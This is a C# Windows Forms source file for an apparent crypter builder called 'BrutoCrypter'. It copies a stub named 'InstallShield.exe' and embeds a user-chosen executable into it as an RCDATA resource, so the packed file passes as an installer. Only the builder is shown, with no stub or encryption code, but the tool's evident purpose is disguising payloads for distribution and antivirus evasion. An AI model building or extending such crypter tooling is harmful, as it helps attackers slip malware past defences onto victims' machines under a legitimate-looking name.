using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Windows.Forms;

namespace BrutoCrypter.Forms
{
    public partial class Main : Form
    {

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr FindResource(IntPtr hModule, uint lpName, uint lpType);
        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern int UpdateResource(IntPtr hUpdate, uint lpType, uint lpName, ushort wLanguage, IntPtr lpData, uint cbData);
        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern int UpdateResource(IntPtr hUpdate, uint lpType, string lpName, ushort wLanguage, IntPtr lpData, uint cbData);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr BeginUpdateResource(string pFileName, bool bDeleteExistingResources);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool EndUpdateResource(IntPtr hUpdate, bool fDiscard);
        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr LoadLibraryEx(string lpLibFileName, IntPtr hFile, uint dwFlags);
        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr LoadLibrary(string lpLibFileName);
        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool FreeLibrary(IntPtr hModule);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr LockResource(IntPtr hGlobalResource);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern uint SizeofResource(IntPtr hModule, IntPtr hResInfo);
        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr LoadResource(IntPtr hModule, IntPtr hResInfo);
        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool FreeResource(IntPtr hResData);

        public const uint RT_VERSION = 16u;
        public const uint RT_ICON = 3u;
        public const uint RT_GROUP_ICON = RT_ICON + 11u;

        private const uint RT_CURSOR = 0x00000001;
        private const uint RT_BITMAP = 0x00000002;
        private const uint RT_MENU = 0x00000004;
        private const uint RT_DIALOG = 0x00000005;
        private const uint RT_STRING = 0x00000006;
        private const uint RT_FONTDIR = 0x00000007;
        private const uint RT_FONT = 0x00000008;
        private const uint RT_ACCELERATOR = 0x00000009;
        private const uint RT_RCDATA = 0x0000000a;
        private const uint RT_MESSAGETABLE = 0x0000000b;

        public const uint RESOURCE_ONLY = 0x00000020u | 0x00000002u;
        public const uint LOAD_LIBRARY_AS_DATAFILE = 0x00000002;

        public const ushort ENGLISH_USA = 1033;
        public Main()
        {
            InitializeComponent();
        }

        public void CheckStubExists()
        {

            if (!File.Exists("Stub\\InstallShield.exe"))
            {
                MessageBox.Show("ERROR: No stub file detected in Stub\\InstallShield.exe", "ERROR", MessageBoxButtons.OK, MessageBoxIcon.Error);
                Application.Exit();
            }
        }

        private void Main_Load(object sender, EventArgs e)
        {
            CheckStubExists();
        }

        private void button1_Click(object sender, EventArgs e)
        {
           if (openFileDialog2.ShowDialog()  == DialogResult.OK)
            {
                textBox1.Text = openFileDialog2.FileName;
            }
        }

        private void button2_Click(object sender, EventArgs e)
        {
            if ( saveFileDialog1.ShowDialog() ==  DialogResult.OK )
            {
                textBox2.Text = saveFileDialog1.FileName;
            }
        }

        private void button3_Click(object sender, EventArgs e)
        {
            byte[] data =File.ReadAllBytes(textBox1.Text);
           GCHandle myHandle =  GCHandle.Alloc(data, GCHandleType.Pinned);


            if (File.Exists(textBox2.Text)) File.Delete(textBox2.Text);
            File.Copy("Stub\\InstallShield.exe", textBox2.Text);
            IntPtr hSourceFile = LoadLibraryEx(textBox2.Text, IntPtr.Zero, LOAD_LIBRARY_AS_DATAFILE);
            IntPtr hUpdate = BeginUpdateResource(textBox2.Text, false);
            UpdateResource(hUpdate, RT_RCDATA, "TEXT", ENGLISH_USA, myHandle.AddrOfPinnedObject(),  (uint)data.Length);
            EndUpdateResource(hUpdate, false);

            myHandle.Free();

            FreeLibrary(hSourceFile);
        }

    }
}
